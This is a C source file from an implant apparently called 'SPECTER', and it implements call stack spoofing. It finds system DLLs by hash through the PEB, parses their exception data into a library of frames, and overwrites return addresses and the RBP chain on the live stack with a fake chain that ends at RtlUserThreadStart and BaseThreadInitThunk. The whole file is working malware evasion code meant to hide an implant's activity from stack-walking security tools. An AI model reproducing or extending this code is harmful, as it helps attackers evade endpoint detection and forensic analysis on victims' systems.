/**
 * SPECTER Implant — Call Stack Spoofing
 *
 * Builds a library of valid stack frames from loaded system DLLs
 * (kernel32, ntdll, user32, rpcrt4, combase) by parsing their .text
 * and .pdata sections.  Selects semantically plausible frame chains
 * terminating at RtlUserThreadStart/BaseThreadInitThunk and writes
 * spoofed return addresses with valid RBP chain integrity.
 */

#include "specter.h"
#include "ntdefs.h"
#include "peb.h"
#include "evasion.h"

/* ------------------------------------------------------------------ */
/*  Internal PRNG for frame randomization                              */
/* ------------------------------------------------------------------ */

static DWORD evasion_prng_next(EVASION_CONTEXT *ctx) {
    ctx->prng_state = ctx->prng_state * 1103515245 + 12345;
    return (ctx->prng_state >> 16) & 0x7FFF;
}

/* ------------------------------------------------------------------ */
/*  Target DLL hashes for frame library enumeration                    */
/* ------------------------------------------------------------------ */

static const DWORD g_frame_dll_hashes[] = {
    HASH_KERNEL32_DLL,
    HASH_NTDLL_DLL,
    HASH_USER32_DLL,
    HASH_RPCRT4_DLL,
    HASH_COMBASE_DLL,
};

#define FRAME_DLL_COUNT (sizeof(g_frame_dll_hashes) / sizeof(g_frame_dll_hashes[0]))

/* ------------------------------------------------------------------ */
/*  parse_module_frames — extract frame entries from a single DLL      */
/* ------------------------------------------------------------------ */

static DWORD parse_module_frames(PVOID module_base, DWORD module_hash,
                                 FRAME_ENTRY *out, DWORD max_entries) {
    if (!module_base || max_entries == 0)
        return 0;

    PBYTE base = (PBYTE)module_base;

    /* Parse PE headers */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != 0x5A4D)
        return 0;

    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(base + dos->e_lfanew);
    if (nt->Signature != 0x00004550)
        return 0;

    /* Locate .pdata (exception directory) */
    if (nt->OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_EXCEPTION)
        return 0;

    IMAGE_DATA_DIRECTORY exc_dir =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    if (exc_dir.VirtualAddress == 0 || exc_dir.Size == 0)
        return 0;

    PRUNTIME_FUNCTION funcs = (PRUNTIME_FUNCTION)(base + exc_dir.VirtualAddress);
    DWORD func_count = exc_dir.Size / sizeof(RUNTIME_FUNCTION);

    /* Locate .text section bounds for validation */
    PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)(
        (PBYTE)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);

    DWORD text_rva_start = 0;
    DWORD text_rva_end = 0;

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & 0x20000000) { /* IMAGE_SCN_MEM_EXECUTE */
            text_rva_start = sec[i].VirtualAddress;
            text_rva_end = sec[i].VirtualAddress + sec[i].VirtualSize;
            break;
        }
    }

    if (text_rva_start == 0)
        return 0;

    DWORD written = 0;

    for (DWORD i = 0; i < func_count && written < max_entries; i++) {
        RUNTIME_FUNCTION *rf = &funcs[i];

        /* Validate: function must be within .text section */
        if (rf->BeginAddress < text_rva_start || rf->EndAddress > text_rva_end)
            continue;

        /* Validate: function must have a reasonable size (>= 4 bytes) */
        if (rf->EndAddress <= rf->BeginAddress)
            continue;
        DWORD func_size = rf->EndAddress - rf->BeginAddress;
        if (func_size < 4)
            continue;

        /* Validate: unwind info must exist */
        if (rf->UnwindInfoAddress == 0)
            continue;

        /* Validate: unwind info should point within the image */
        if (rf->UnwindInfoAddress >= nt->OptionalHeader.SizeOfImage)
            continue;

        /* Read unwind info flags to verify it's a valid entry */
        PBYTE unwind = base + rf->UnwindInfoAddress;
        BYTE version_flags = unwind[0];
        BYTE version = version_flags & 0x07;

        /* Only accept version 1 unwind info (standard) */
        if (version != 1)
            continue;

        /* Skip very small functions that are unlikely to appear in stacks */
        if (func_size < 16)
            continue;

        out[written].code_start  = (PVOID)(base + rf->BeginAddress);
        out[written].code_end    = (PVOID)(base + rf->EndAddress);
        out[written].unwind_info = (PVOID)unwind;
        out[written].module_hash = module_hash;
        written++;
    }

    return written;
}

/* ------------------------------------------------------------------ */
/*  evasion_init_frames                                                */
/* ------------------------------------------------------------------ */

NTSTATUS evasion_init_frames(EVASION_CONTEXT *ctx) {
    if (!ctx)
        return STATUS_INVALID_PARAMETER;

    FRAME_LIBRARY *lib = &ctx->frame_lib;
    lib->count = 0;
    lib->max_capacity = FRAME_MAX_ENTRIES;

    /* Seed PRNG from a simple source */
#ifndef TEST_BUILD
    DWORD lo, hi;
    __asm__ __volatile__("rdtsc" : "=a"(lo), "=d"(hi));
    ctx->prng_state = lo ^ (hi << 16) ^ 0xCAFEBABE;
#endif

    /* Walk PEB→Ldr to enumerate target DLLs */
    for (DWORD d = 0; d < FRAME_DLL_COUNT; d++) {
        PVOID mod_base = find_module_by_hash(g_frame_dll_hashes[d]);
        if (!mod_base)
            continue;

        DWORD remaining = lib->max_capacity - lib->count;
        if (remaining == 0)
            break;

        DWORD added = parse_module_frames(
            mod_base, g_frame_dll_hashes[d],
            &lib->entries[lib->count], remaining);

        lib->count += added;
    }

    if (lib->count == 0)
        return STATUS_UNSUCCESSFUL;

    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  find_termination_frame — locate RtlUserThreadStart or              */
/*  BaseThreadInitThunk in the frame library                           */
/* ------------------------------------------------------------------ */

static FRAME_ENTRY *find_termination_frame(FRAME_LIBRARY *lib,
                                           DWORD target_hash) {
    /* Look for a frame from kernel32 (BaseThreadInitThunk) or
       ntdll (RtlUserThreadStart) */
    DWORD target_dll = (target_hash == HASH_BASETHREADINITTHUNK)
                       ? HASH_KERNEL32_DLL : HASH_NTDLL_DLL;

    /* Resolve the actual function address */
    PVOID func_addr = resolve_function(target_dll, target_hash);
    if (!func_addr)
        return NULL;

    /* Find the frame entry that contains this function */
    for (DWORD i = 0; i < lib->count; i++) {
        if ((ULONG_PTR)func_addr >= (ULONG_PTR)lib->entries[i].code_start &&
            (ULONG_PTR)func_addr <  (ULONG_PTR)lib->entries[i].code_end) {
            return &lib->entries[i];
        }
    }

    return NULL;
}

/* ------------------------------------------------------------------ */
/*  evasion_select_frames                                              */
/* ------------------------------------------------------------------ */

DWORD evasion_select_frames(EVASION_CONTEXT *ctx, DWORD target_func_hash,
                            FRAME_ENTRY **chain_out, DWORD count) {
    if (!ctx || !chain_out || count == 0 || ctx->frame_lib.count == 0)
        return 0;

    FRAME_LIBRARY *lib = &ctx->frame_lib;

    if (count > FRAME_CHAIN_MAX)
        count = FRAME_CHAIN_MAX;

    /* We need at least 2 slots: one for the body, one for termination */
    if (count < 2)
        count = 2;

    DWORD written = 0;

    /* Find termination frames:
       slot [count-1] = RtlUserThreadStart (ntdll)
       slot [count-2] = BaseThreadInitThunk (kernel32) */
    FRAME_ENTRY *term_rtl = find_termination_frame(lib, HASH_RTLUSERTHREADSTART);
    FRAME_ENTRY *term_base = find_termination_frame(lib, HASH_BASETHREADINITTHUNK);

    /* Fill body frames with randomized selections from the library.
       Prefer frames from the same module as the target function for
       semantic plausibility. */
    (void)target_func_hash; /* Used for future semantic matching */

    DWORD body_count = count;
    if (term_base) body_count--;
    if (term_rtl)  body_count--;

    /* Select random body frames, avoiding duplicates */
    for (DWORD i = 0; i < body_count && written < count; i++) {
        DWORD rand_val = evasion_prng_next(ctx);
        DWORD idx = rand_val % lib->count;

        FRAME_ENTRY *candidate = &lib->entries[idx];

        /* Skip termination functions in body slots */
        if (candidate == term_rtl || candidate == term_base)
            continue;

        chain_out[written++] = candidate;
    }

    /* Append BaseThreadInitThunk if found */
    if (term_base && written < count) {
        chain_out[written++] = term_base;
    }

    /* Append RtlUserThreadStart as the final frame */
    if (term_rtl && written < count) {
        chain_out[written++] = term_rtl;
    }

    return written;
}

/* ------------------------------------------------------------------ */
/*  evasion_build_spoofed_stack                                        */
/* ------------------------------------------------------------------ */

NTSTATUS evasion_build_spoofed_stack(FRAME_ENTRY **chain, DWORD count,
                                     QWORD original_rsp,
                                     SAVED_STACK_FRAMES *saved) {
    if (!chain || count == 0 || !saved || original_rsp == 0)
        return STATUS_INVALID_PARAMETER;

    if (count > SAVED_FRAMES_MAX)
        count = SAVED_FRAMES_MAX;

    /* Save original state for later restoration */
    saved->original_rsp = original_rsp;
    saved->frame_count = 0;

    QWORD *stack = (QWORD *)original_rsp;

    /* Save and replace return addresses on the stack.
     *
     * Stack layout for x64 Windows:
     *   [RSP+0x00] = return address
     *   [RSP+0x08] = saved RBP (optional, depends on frame)
     *
     * We write spoofed return addresses pointing into the middle
     * of each frame's code range (after the prologue) to ensure
     * the addresses look legitimate to stack walkers.
     */
    for (DWORD i = 0; i < count; i++) {
        FRAME_ENTRY *frame = chain[i];

        /* Calculate a plausible return address within the function body.
         * Skip the first ~16 bytes (prologue) and point into the body. */
        ULONG_PTR func_start = (ULONG_PTR)frame->code_start;
        ULONG_PTR func_end   = (ULONG_PTR)frame->code_end;
        ULONG_PTR func_size  = func_end - func_start;

        /* Place return address at ~25% into the function (past prologue) */
        ULONG_PTR offset = func_size / 4;
        if (offset < 16) offset = 16;
        if (offset > func_size - 1) offset = func_size / 2;

        QWORD spoofed_ret = (QWORD)(func_start + offset);

        /* Save original value at this stack slot */
        DWORD slot = i;  /* Each frame occupies one return address slot */
        saved->saved_return_addrs[i] = stack[slot * 2]; /* ret addr */
        saved->saved_rbp_chain[i]    = stack[slot * 2 + 1]; /* rbp */

        /* Write spoofed return address */
        stack[slot * 2] = spoofed_ret;

        /* Write RBP chain: point to the next frame's stack slot
         * to maintain a valid RBP chain for unwinders */
        if (i + 1 < count) {
            stack[slot * 2 + 1] = original_rsp + ((QWORD)(slot + 1) * 16);
        } else {
            /* Last frame: terminate RBP chain with 0 */
            stack[slot * 2 + 1] = 0;
        }

        saved->frame_count++;
    }

    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  evasion_restore_stack                                              */
/* ------------------------------------------------------------------ */

void evasion_restore_stack(SAVED_STACK_FRAMES *saved) {
    if (!saved || saved->frame_count == 0 || saved->original_rsp == 0)
        return;

    QWORD *stack = (QWORD *)saved->original_rsp;

    /* Restore original return addresses and RBP chain */
    for (DWORD i = 0; i < saved->frame_count; i++) {
        DWORD slot = i;
        stack[slot * 2]     = saved->saved_return_addrs[i];
        stack[slot * 2 + 1] = saved->saved_rbp_chain[i];
    }

    /* Zero out saved state */
    spec_memset(saved, 0, sizeof(SAVED_STACK_FRAMES));
}

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
void evasion_test_set_prng_seed(EVASION_CONTEXT *ctx, DWORD seed) {
    if (ctx)
        ctx->prng_state = seed;
}
#endif
